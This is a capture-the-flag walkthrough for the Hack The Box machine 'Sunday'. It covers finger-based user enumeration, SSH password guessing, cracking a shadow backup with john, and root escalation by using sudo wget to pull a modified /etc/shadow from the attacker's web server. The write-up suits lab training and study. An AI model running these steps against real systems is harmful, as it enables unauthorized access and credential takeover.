---
layout: post
title: "Sunday"
categories: HTB-Walkthrough
---

![sunday](/assets/img/sunday/sunday1.png)


`nmap -sV -Pn -v 10.10.10.76 |tee -a sun.txt`

```

PORT    STATE SERVICE VERSION
79/tcp  open  finger  Sun Solaris fingerd
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

```

Use [finger](https://www.tutorialspoint.com/unix_commands/finger.htm) to see who's logged on.

```
root@kali:~/HTB/vip/sunday# finger @10.10.10.76
No one logged on
```

[PentestMonkey](http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz) has a good perl script
to enumerate users.

```
root@kali:~/HTB/vip/sunday/finger-user-enum-1.0# perl finger-user-enum.pl -t 10.1
0.10.76 -U /root/wordlists/rockyou.txt 
```

2 usernames are found

`sammy`
`sunny`



Manually testing the password, sometimes using the name of the box can come up trumps!

```
ssh sunny@10.10.10.76 -p 22022


Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

```


Try again:


```
root@kali:~/HTB/prep/sunday# ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76 -p22022
```

The password `sunday` works!





```
sunny@sunday:~$ uname -a
SunOS sunday 5.11 snv_111b i86pc i386 i86pc Solaris
```

One of the first commands to try on machines that might have `sudo` running is 
`sudo -l`, to list the commands the user can run as root.

```
sunny@sunday:~$ sudo -l                                                                                            
User sunny may run the following commands on this host:                                                            
    (root) NOPASSWD: /root/troll                                                                                   
sunny@sunday:~$        
```

Interesting...

```
sunny@sunday:~$ cat /root/troll                                                                                    
cat: /root/troll: Permission denied                                                                                
sunny@sunday:~$ ls -la /root                                                                                       
ls: cannot open directory /root: Permission denied   
```

So we can execute a file that we can't read!



Searching `/` folder, we find an interesting backup file.

![shadow-backup](/assets/img/sunday/sunday-found-shadowbackup.png)


Copy the hashes to hash.txt and let john do the legwork!


```

john hash.txt --wordlist=/root/wordlists/rockyou.txt
 
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status

sunday           (sunny)
cooldude!        (sammy)

2g 0:00:07:54 100% 0.004215g/s 429.1p/s 434.1c/s 434.1C/s coolster..colima1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

we can ssh in again as `sammy` with the password `cooldude!`

```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sammy@10.10.10.76 -p22022
```

We can grab the user flag from Sammy's Desktop:

```
sammy@sunday:~/Desktop$ cat user.txt
a3xxxxxxxxxxxxxxxxxxxxxxxxxxxx98
sammy@sunday:~/Desktop$ 
```

<h3>Privilege Escalation</h3>


Running `sudo -l` again as sammy, to see what this user can do as root:

```
sammy@sunday:~/Desktop$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

the `-O` flag in wget commands will write out to a desired location, we can do this as root with `sammy`

Copy the shadow.backup contents to the Kali machine, save the file as `shadow`,

add an entry for root at the bottom, copying the password hash for sunny (sunday) to the entry.

![shadowroot](/assets/img/sunday/sunday-shadowroot.png)

serve the file with python web server
```
python3 -m http.server 80
```



Use the `sudo wget` command to replace the existing /etc/shadow file with the modified one, and root's password will now be 'sunday',
and we can just su root to get the root-shell.


```
sudo wget -O /etc/shadow http://10.10.14.17/shadow
```

Now get root.

```
sammy@sunday:/etc$ su root
Password: 

sammy@sunday:/etc# id
uid=0(root) gid=0(root)
sammy@sunday:/etc# clear
sammy@sunday:/etc# cd /root
sammy@sunday:/root# cat root.txt
fbxxxxxxxxxxxxxxxxxxxxxxxxxxxxb8
```

:)
